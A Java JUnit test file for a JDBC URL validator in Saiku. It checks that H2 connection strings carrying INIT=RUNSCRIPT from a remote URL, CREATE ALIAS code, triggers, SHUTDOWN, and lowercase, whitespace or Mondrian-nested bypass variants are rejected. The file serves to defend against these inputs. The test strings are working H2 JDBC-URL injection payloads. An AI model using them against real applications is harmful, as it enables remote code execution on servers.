/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.web.rest.objects;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import org.junit.Test;

public class JdbcUrlValidatorTest {

    @Test
    public void rejectsH2InitRunscript() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://e/p.sql'");
            fail("expected IllegalArgumentException for H2 INIT=RUNSCRIPT");
        } catch (IllegalArgumentException e) {
            assertTrue(e.getMessage(), e.getMessage().toLowerCase().contains("jdbc url"));
        }
    }

    @Test
    public void rejectsH2CreateAlias() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;INIT=CREATE ALIAS EXEC AS $$ String x() { return \"y\"; } $$");
            fail("expected IllegalArgumentException for H2 CREATE ALIAS");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void rejectsH2CreateTrigger() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;INIT=CREATE TRIGGER t BEFORE INSERT ON s");
            fail("expected IllegalArgumentException for H2 CREATE TRIGGER");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void rejectsH2Shutdown() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;SHUTDOWN");
            fail("expected IllegalArgumentException for H2 SHUTDOWN");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void rejectsH2InitNestedInMondrianWrapper() {
        try {
            JdbcUrlValidator.validate(
                    "jdbc:mondrian:Jdbc=jdbc:h2:./foodmart;INIT=RUNSCRIPT FROM 'http://e/p.sql';Catalog=mondrian://Foodmart;JdbcDrivers=org.h2.Driver");
            fail("expected IllegalArgumentException for H2 INIT nested in mondrian wrapper");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void acceptsNormalPostgres() {
        // Should not throw.
        JdbcUrlValidator.validate("jdbc:postgresql://h/db");
    }

    @Test
    public void acceptsMondrianWrappedH2WithoutInit() {
        // Legitimate Mondrian datasource over an embedded H2 file — no INIT/RUNSCRIPT/ALIAS.
        JdbcUrlValidator.validate(
                "jdbc:mondrian:Jdbc=jdbc:h2:./foodmart;Catalog=mondrian://Foodmart;JdbcDrivers=org.h2.Driver");
    }

    @Test
    public void acceptsNull() {
        JdbcUrlValidator.validate(null);
    }

    /* ---- case / whitespace bypass class (locks the (?i) defense + untested branches) ---- */
    //
    // The validator's entire RCE defense is case-insensitive: the H2 sub-URL is
    // detected via lower-cased contains("jdbc:h2:") and the dangerous tokens via
    // (?i) regexes. Nothing locked that — every payload above is UPPERCASE — so a
    // refactor that dropped the (?i) flags (or the lower-casing on the H2 gate)
    // would silently reopen the admin-RCE with the suite still green. These pin
    // the bypass class and the two previously-untested branches (CREATE FORCE,
    // standalone RUNSCRIPT).

    @Test
    public void rejectsLowercaseH2InitRunscript() {
        assertRejected("jdbc:h2:mem:x;init=runscript from 'http://e/p.sql'");
    }

    @Test
    public void rejectsLowercaseH2CreateAlias() {
        // No INIT= here, so this exercises the CREATE-ALIAS pattern itself, case-insensitively.
        assertRejected("jdbc:h2:mem:x;create alias EXEC AS $$ String x() { return \"y\"; } $$");
    }

    @Test
    public void rejectsUppercaseSchemeH2Init() {
        // The H2 detection itself must be case-insensitive: an upper-cased scheme
        // must not slip past the looksH2 gate (it lower-cases before contains()).
        assertRejected("JDBC:H2:MEM:X;INIT=RUNSCRIPT FROM 'http://e/p.sql'");
    }

    @Test
    public void rejectsH2InitWithWhitespaceAroundEquals() {
        // `INIT\\s*=` tolerates padding — `INIT = RUNSCRIPT` must still be caught.
        assertRejected("jdbc:h2:mem:x;INIT = RUNSCRIPT FROM 'http://e/p.sql'");
    }

    @Test
    public void rejectsH2CreateForce() {
        // CREATE FORCE is in the H2_CREATE_EXEC pattern but had no test.
        assertRejected("jdbc:h2:mem:x;CREATE FORCE VIEW v AS SELECT 1");
    }

    @Test
    public void rejectsH2StandaloneRunscript() {
        // RUNSCRIPT is blocked anywhere (defence in depth), not only via INIT=.
        assertRejected("jdbc:h2:mem:x;runscript from 'http://e/p.sql'");
    }

    @Test
    public void rejectsLowercaseH2Shutdown() {
        assertRejected("jdbc:h2:mem:x;shutdown");
    }

    private static void assertRejected(String url) {
        try {
            JdbcUrlValidator.validate(url);
            fail("expected IllegalArgumentException for: " + url);
        } catch (IllegalArgumentException expected) {
            assertTrue(
                    "rejection should identify an invalid JDBC URL, was: " + expected.getMessage(),
                    expected.getMessage().toLowerCase().contains("jdbc url"));
        }
    }
}
